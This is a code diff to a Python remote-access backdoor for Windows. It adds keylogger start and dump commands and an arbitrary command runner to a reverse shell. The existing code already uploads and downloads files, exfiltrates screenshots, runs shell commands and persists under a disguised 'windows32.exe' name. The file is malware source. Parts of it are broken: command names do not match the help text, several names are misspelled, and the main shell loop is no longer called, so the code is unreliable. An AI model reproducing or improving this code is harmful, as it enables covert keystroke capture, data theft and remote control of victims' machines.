@@ -10,6 +10,8 @@ import sys
 import time
 import requests
 from mss import mss
+import keylogger
+import threading
 
 def reliable_send(data):
         json_data = json.dumps(data)
@@ -24,7 +26,7 @@ def reliable_recv():
                 except ValueError:
                        continue
 
-def is _admin():
+def is_admin():
 	global admin
 	try:
 		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\Windows'),'temp']))
@@ -57,15 +59,22 @@ def shell():
 	while True:
 		command = reliable_recv()
 		if command == 'q':
+			continue
+		elif command == "exit":
 			break
+		elif command[:7] == "sendall":
+			subprocess.Popen(command[8:], shell=True)
 		elif command == "help":
-			help_options = '''					download path --> Download A File From Target PC
-					upload path --> Upload A File To Target PC
-					get url     --> Download A File To Target PC From Any Website
-					start path  --> Start A Program On Target PC
-					screenshot  --> Take A Screenshot Of Targets Monitor
-					check       --> Check For The Administrator Privileges
-					q           --> Exit The Reverse Shell '''
+			help_options = '''					download path     --> Download A File From Target PC
+					upload path     --> Upload A File To Target PC
+					get url         --> Download A File To Target PC From Any Website
+					start path      --> Start A Program On Target PC
+					screenshot      --> Take A Screenshot Of Targets Monitor
+					check           --> Check For The Administrator Privileges
+					keylogger_start --> Start The Keylogger
+					keylogger_dump  --> Dump The Keystrokes From Keylogger
+					q               --> Exit The Reverse Shell '''
+
 			reliable_send(help_opt)
 		elif command[:2] == "cd" and len(command) > 1:
 			try:
@@ -90,7 +99,7 @@ def shell():
 			try:
 				screenshot()
 				with open("monitor-1.png","rb") as sc:
-					realible_send(base64.b64encode(sc.read)))
+					realible_send(base64.b64encode(sc.read))
 				os.remove("monitor-1.png")
 			except:
 				reliable_send("[!!] Failed To Take Screenshot")
@@ -106,12 +115,18 @@ def shell():
 				reliable_send(admin)
 			except:
 				reliable_send("Cannot Perform The Check")
+		elif command [:12] == "keylog_start":
+			t1 = threading.Thread(target=keylogger.start)
+			t1.start()
+		elif command[:11] == "keylog_dump":
+			fn = open(keylogger_path, "r")
+			reliable_send(fn.read())
 		else:
 			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = proc.stdout.read() + proc.stderr.read()
 			reliable_send(result)
 
-
+keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
 location = os.environ["appdata"] + "\\windows32.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable,location)
@@ -120,5 +135,4 @@ if not os.path.exists(location):
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 connection()
-shell()
 sock.close()
